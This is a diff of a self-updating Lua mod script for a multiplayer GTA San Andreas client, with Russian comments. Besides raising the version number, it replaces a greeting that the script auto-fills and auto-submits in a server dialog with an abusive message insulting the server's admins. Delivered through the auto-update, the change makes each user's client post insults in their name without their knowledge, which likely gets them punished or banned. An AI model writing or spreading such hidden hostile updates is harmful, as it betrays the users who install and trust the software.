@@ -12,7 +12,7 @@ encoding.default = 'CP1251'
 local u8 = encoding.UTF8
 
 -- ============================ [ НАСТРОЙКИ ОБНОВЛЕНИЙ ] ============================
-local SCRIPT_VERSION = 5 -- ПРИ ОБНОВЛЕНИИ НА ГИТХАБЕ МЕНЯЙ ЭТО ЧИСЛО НА 4, 5 и т.д.
+local SCRIPT_VERSION = 6 -- ПРИ ОБНОВЛЕНИИ НА ГИТХАБЕ МЕНЯЙ ЭТО ЧИСЛО НА 4, 5 и т.д.
 local SCRIPT_URL = "https://raw.githubusercontent.com/sanya-developer111/modluasamp/refs/heads/main/mod.lua"
 local update_checking = false
 -- ==================================================================================
@@ -110,7 +110,7 @@ function sampev.onShowDialog(dialogId, style, title, button1, button2, text)
         lua_thread.create(function()
             wait(100) -- Небольшая задержка для прогрузки диалога
             -- Отправляем чистый русский текст без декодеров
-            sampSetCurrentDialogEditboxText("Всем привет!")
+            sampSetCurrentDialogEditboxText("АДМИНЫ ТВАРИ ГОРЕТЬ ВАМ В АДУ! ПРОЕКТ ГОВНА ПОСТОЯННО УБИВАЮТ ДОНАТНАЯ ПОМОЙКА")
             wait(50)
             sampCloseCurrentDialogWithButton(1) -- Нажимает Enter (Кнопку 1)
         end)
